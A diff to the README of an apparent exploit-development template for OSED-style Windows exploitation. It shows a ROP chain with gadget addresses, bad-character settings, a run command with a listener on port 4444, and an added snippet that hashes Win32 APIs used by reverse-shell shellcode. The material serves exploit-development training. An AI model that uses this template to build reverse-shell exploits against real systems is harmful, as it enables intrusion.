@@ -31,7 +31,7 @@ def C(rop_address):
 
 Your RopChain should look something like this:
 ```python
-ropchain = RopChain(badchars)
+ropchain = RopChain(bad_chars)
 		
 # ROPCHAIN
 ropchain.append(C(0x10154112))			# push esp ; inc ecx ; adc eax, 
@@ -52,8 +52,21 @@ python OSED_exploit.py -t 127.0.0.1 -li 127.0.0.1 -lp 4444
 
 Remember to update `badchars`!
 ```
-badchars = b"\x00\x3d\x0d\x0a\x25\x26"
+bad_chars = b"\x00"
 ```
 
+If you're writing Shellcode that uses different Win32 APIs, make sure to change the loaded modules so the hash keys generated don't have bad characters.
+```python
+hash_key = find_hash_key(
+	[
+	("KERNEL32.DLL", "LoadLibraryA"),
+	("WS2_32.DLL", "WSAStartup"),
+	("WS2_32.DLL", "WSASocketA"),
+	("WS2_32.DLL", "WSAConnect"),
+	("KERNEL32.DLL", "CreateProcessA"),
+	("KERNEL32.DLL", "TerminateProcess")
+	], bad_chars
+)
+```
 
 ## Disclaimer
